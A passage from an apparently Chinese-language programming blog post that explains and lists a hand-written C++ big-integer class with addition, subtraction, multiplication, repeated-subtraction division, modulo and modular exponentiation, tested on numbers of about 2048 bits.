class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>;<span class="comment">//借位函数，方便更新处理减法与除法之后的前导零</span></span><br></pre></td></tr></table></figure><p>由于计算要满足 <strong>语义完备性</strong>， 我们可以将 <strong>＞ ＜ ＝</strong> 之类的符号只实现其中两个，另一个用前面两个符号的逻辑表达式来表示。这样可以减小算法编写量。</p><p>比如我的取模运算就是利用 <strong>a % b = a - (a / b * b)</strong> 的算式来进行的，目的是尽量减少重复计算的编写，避免语义重复导致代码冗杂。</p><p>这里的除法应用了试根法，通过不断减去除数，直到结果小于等于0，减去除数的次数便是最终的结果。</p><h2 id="Example">Example</h2><p><strong>2^2048</strong> 量级</p><p><strong>X=</strong> 12482264789495844167952743674345192058347658696244846024506086756017404270329316853273041017249678950066348595640122013326388180800571171673805957545645811138822997641052783783643217674156834480484155675467569932624307075411108488522509264028054521773056807183216239690927306363502717731691081745037043661929912687363727319054138337027541053221928309092332845113037444417624930690136431627266175440870332546279455634900371634225967525289205393311361381052800131349877664888848787057588470069212633123461825711669157225916604667745476377157310522514234303671161858238888360921077671217358198370531988343589559604876284</p><p><strong>Y=</strong> 1280730864615811759821132949087528726325520041739385671708858051142109630967299023961230758400337351772390265280394429009926875184005772035344541944036323178042973490581385536990180703449459150513955554549596768053810110112451980299436720866146499950924670995962445917972409391039058909325472146973088609382932848054367560562133611270686707661165793779566207985413463940767202953610885199897580866376092558784820762217980107705915440804143477818053671563647690424246811327119924020088286709086413582886779320723275600807886717409943439676762548169766661227661132724874836952052156168392209434986629771081555443608284</p><p><strong>m=</strong> 26276671267336699549929786692210641894085878508699738341408482869283000463006609816748150758887020789500336306584836616160250372409642949310833789547133401665674848173946416217142121019602682188968147765629440590913830497348564644309060269315465932613732738758615722069669745219203052852800610504371627718589337502423268449548364104210930215810677840459085169776897907731873142754299180658298179972639899398242262850797386228967175906205170668840014770506566561161713676741346132712253755150416478986782691455647303372766626483759402251334751219513662706582839143768502897185844861757936312109408176137579367017788106</p><p><strong>还是能在六分钟之内跑出来。</strong></p><p>（主要是除法用了试根法，导致计算时间大大增长）</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/01/06/1dWaGrS7UMRhE9B.png" alt="1.png"></p><h2 id="Code">Code</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Digit_Per_Num = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//digits to be stored into an int(accept range:(1-2));</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigInt</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">1000</span>]; <span class="comment">// both int and longlong are valid</span></span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> neg;<span class="comment">// is it a negative number</span></span><br><span class="line">BigInt()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;n = <span class="keyword">this</span>-&gt;neg = <span class="keyword">this</span>-&gt;num[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">BigInt(<span class="built_in">string</span>);</span><br><span class="line">BigInt <span class="keyword">operator</span> -()&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;neg ^= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">to_binary_string</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a);</span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b);</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b);</span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b);</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>;</span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>;</span><br><span class="line"><span class="function">BigInt <span class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BigInt::BigInt(<span class="built_in">string</span> s)&#123;</span><br><span class="line"><span class="keyword">if</span>(s.substr(<span class="number">0</span>,<span class="number">1</span>).c_str()[<span class="number">0</span>] == <span class="string">'-'</span>)&#123;</span><br><span class="line">s = s.substr(<span class="number">1</span>);</span><br><span class="line">neg = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> neg = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(s.substr(<span class="number">0</span>,<span class="number">1</span>).c_str()[<span class="number">0</span>] == <span class="string">'0'</span>)</span><br><span class="line">s = s.substr(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// to cut off leading zero</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>-&gt;n = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(s.size() &gt;= Digit_Per_Num+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;num[<span class="keyword">this</span>-&gt;n++] = atoi(s.substr(s.size() - Digit_Per_Num).c_str());</span><br><span class="line">s = s.substr(<span class="number">0</span>, s.size() - Digit_Per_Num);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;num[<span class="keyword">this</span>-&gt;n] = atoi(s.c_str());</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pushup(*<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> BigInt::to_binary_string()&#123;</span><br><span class="line"><span class="built_in">string</span> out;</span><br><span class="line">BigInt temp = *<span class="keyword">this</span>;</span><br><span class="line">BigInt t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> neg = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(temp &lt; BigInt(<span class="string">"0"</span>))</span><br><span class="line">neg = <span class="number">1</span>;</span><br><span class="line">temp.neg = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(temp != BigInt(<span class="string">"0"</span>))&#123;</span><br><span class="line">t = temp % BigInt(<span class="string">"2"</span>);</span><br><span class="line"><span class="keyword">if</span>(t.num[<span class="number">0</span>] == <span class="number">1</span>)</span><br><span class="line">out = <span class="string">"1"</span> + out;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">out = <span class="string">"0"</span> + out;</span><br><span class="line">temp = temp / BigInt(<span class="string">"2"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(neg)</span><br><span class="line">out = <span class="string">"-"</span> + out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp; <span class="keyword">operator</span> &lt;&lt; (ostream &amp;os, BigInt a)&#123;</span><br><span class="line"><span class="keyword">if</span>(a.neg)</span><br><span class="line">os &lt;&lt; <span class="string">"-"</span>;</span><br><span class="line"><span class="comment">// os &lt;&lt; a.neg? "-":" ";</span></span><br><span class="line"><span class="comment">// negative operator</span></span><br><span class="line"></span><br><span class="line">os &lt;&lt; a.num[a.n];</span><br><span class="line"><span class="comment">// the first one digit has no leading zero</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = a.n<span class="number">-1</span>; i+<span class="number">1</span>; i--)</span><br><span class="line">os &lt;&lt; setfill(<span class="string">'0'</span>) &lt;&lt; setw(Digit_Per_Num) &lt;&lt; a.num[i];</span><br><span class="line"><span class="comment">// add leading zero(s)</span></span><br><span class="line">os &lt;&lt; <span class="string">""</span>; <span class="comment">// I don't know why this must be put here;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> + (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if one is below 0 and the other is above 0, then sub them</span></span><br><span class="line"><span class="keyword">if</span>(a.neg != b.neg)&#123;</span><br><span class="line">b = -b;</span><br><span class="line"><span class="keyword">return</span> a - b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BI.neg = a.neg;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, flag = <span class="number">0</span>, ci = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(a.n &gt;= i || b.n &gt;= i || flag)&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(a.n &lt; i) a.num[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(b.n &lt; i) b.num[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BI.num[i] = a.num[i] + b.num[i] + ci;</span><br><span class="line">ci = BI.num[i] / mod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ci)<span class="comment">//carry</span></span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">BI.num[i] %= mod;</span><br><span class="line">BI.n = i++;</span><br><span class="line">&#125;</span><br><span class="line">pushup(BI);</span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> - (BigInt a, BigInt b)&#123;</span><br><span class="line">BigInt BI;</span><br><span class="line"><span class="keyword">if</span>(a.neg == b.neg)&#123;</span><br><span class="line"><span class="keyword">if</span>(absolute_cmp(a, b))</span><br><span class="line"><span class="keyword">return</span> -(b-a);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">b = -b;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BI.neg = a.neg;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, ci = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(a.n &gt;= i || b.n &gt;= i)&#123;</span><br><span class="line"><span class="keyword">if</span>(a.n &lt; i) a.num[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(b.n &lt; i) b.num[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BI.num[i] = a.num[i] - b.num[i] + ci;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(BI.num[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">BI.num[i] += mod;</span><br><span class="line">ci = <span class="number">-1</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> ci = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BI.n = i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// to cut off leading zero(s)</span></span><br><span class="line">pushdown(BI);</span><br><span class="line">pushup(BI);</span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> * (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(absolute_cmp(b, a))</span><br><span class="line"><span class="keyword">return</span> b * a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)&#123;</span><br><span class="line">BigInt t = b;</span><br><span class="line">t.neg = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> p = a.num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= b.n; j++)</span><br><span class="line">t.num[j] *= p;</span><br><span class="line">pushup(t);</span><br><span class="line"></span><br><span class="line">t = t &lt;&lt; i;</span><br><span class="line">BI = BI + t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BI.neg = a.neg != b.neg;</span><br><span class="line">pushup(BI);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> / (BigInt a, BigInt b)&#123;</span><br><span class="line">BigInt q;</span><br><span class="line"><span class="keyword">const</span> BigInt ZERO;</span><br><span class="line"><span class="keyword">if</span>(b == ZERO)</span><br><span class="line"><span class="keyword">throw</span> <span class="string">"Division by zero condition!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if a &lt; b</span></span><br><span class="line"><span class="keyword">if</span>(absolute_cmp(a, b))</span><br><span class="line"><span class="keyword">return</span> ZERO;</span><br><span class="line"></span><br><span class="line">q.neg = a.neg != b.neg;</span><br><span class="line">a.neg = b.neg = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>; </span><br><span class="line">BigInt t = b &lt;&lt; (a.n - b.n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(a &gt;= t)&#123;</span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">q.n = t.n - b.n;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= q.n; i++)</span><br><span class="line">q.num[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">q.num[t.n - b.n]++;</span><br><span class="line">a = a - t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((a.n == b.n &amp;&amp; a.num[a.n] &lt; b.num[b.n]) || a.n &lt; b.n)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">t = t &gt;&gt; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> % (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> a - (a/b)*b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">if</span>(a.neg != b.neg)</span><br><span class="line"><span class="keyword">return</span> a.neg == <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a.neg == <span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> absolute_cmp(a, b);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> !absolute_cmp(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt; (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> !(a&lt;b) &amp;&amp; a!=b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> == (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> a.neg==b.neg &amp;&amp; !absolute_cmp(a,b) &amp;&amp; !absolute_cmp(b,a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> != (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> !(a==b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;= (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> !(a&gt;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &gt;= (BigInt a, BigInt b)&#123;</span><br><span class="line"><span class="keyword">return</span> !(a&lt;b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> &lt;&lt; (BigInt a, <span class="keyword">int</span> b)&#123;</span><br><span class="line"><span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line">BigInt BI;</span><br><span class="line">BI.neg = a.neg;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)</span><br><span class="line">BI.num[i+b] = a.num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= b<span class="number">-1</span>; i++)</span><br><span class="line">BI.num[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">BI.n = a.n + b;</span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BigInt <span class="keyword">operator</span> &gt;&gt; (BigInt a, <span class="keyword">int</span> b)&#123;</span><br><span class="line"><span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line"><span class="function">BigInt <span class="title">BI</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//result is 0</span></span><br><span class="line"><span class="keyword">if</span>(b &gt;= a.n + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line"></span><br><span class="line">BI.neg = a.neg;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = b; i &lt;= a.n; i++)</span><br><span class="line">BI.num[i-b] = a.num[i];</span><br><span class="line"></span><br><span class="line">BI.n = a.n - b;</span><br><span class="line"><span class="keyword">return</span> BI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// to judge if |a| &lt; |b|</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">absolute_cmp</span><span class="params">(BigInt a, BigInt b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.n != b.n)</span><br><span class="line"><span class="keyword">return</span> a.n &lt; b.n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = a.n; i+<span class="number">1</span>; i--)</span><br><span class="line"><span class="keyword">if</span>(a.num[i] != b.num[i])</span><br><span class="line"><span class="keyword">return</span> a.num[i] &lt; b.num[i];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pushup</span><span class="params">(BigInt &amp;a)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a.n == <span class="number">0</span> &amp;&amp; a.num[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">a.neg = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mod = <span class="built_in">pow</span>(<span class="number">10</span>, Digit_Per_Num);</span><br><span class="line"><span class="keyword">int</span> ci = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= a.n; i++)&#123;</span><br><span class="line">a.num[i] += ci;</span><br><span class="line">ci = a.num[i] / mod;</span><br><span class="line">a.num[i] %= mod; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ci)</span><br><span class="line">a.num[++a.n] = ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">// to cut off leading zero(s)</span></span><br><span class="line">pushdown(a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pushdown</span><span class="params">(BigInt &amp;a)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = a.n;</span><br><span class="line"><span class="keyword">while</span>(i)&#123;</span><br><span class="line"><span class="keyword">if</span>(a.num[i--] == <span class="number">0</span>)</span><br><span class="line">a.n--;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BigInt <span class="title">pow</span><span class="params">(BigInt x, BigInt y, BigInt mod)</span></span>&#123;</span><br><span class="line">BigInt base = x % mod;</span><br><span class="line"><span class="function">BigInt <span class="title">r</span><span class="params">(<span class="string">"1"</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> BigInt <span class="title">ZERO</span><span class="params">(<span class="string">"0"</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> BigInt <span class="title">TWO</span><span class="params">(<span class="string">"2"</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(y != ZERO)&#123;</span><br><span class="line"><span class="keyword">if</span>(y.num[<span class="number">0</span>] &amp; <span class="number">1</span>) r = (r * base) % mod;</span><br><span class="line">base = (base * base) % mod;</span><br><span class="line">y = y / TWO;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"please input a:"</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"><span class="function">BigInt <span class="title">a</span><span class="params">(s)</span></span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"please input b:"</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line"><span class="function">BigInt <span class="title">b</span><span class="params">(s)</span></span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"you just input:"</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a =     "</span> &lt;&lt; a &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"b =     "</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a + b = (binary) "</span> &lt;&lt; (a + b).to_binary_string() &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a - b = "</span> &lt;&lt; a - b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a * b = "</span> &lt;&lt; a * b &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"a / b = "</span> &lt;&lt; a / b 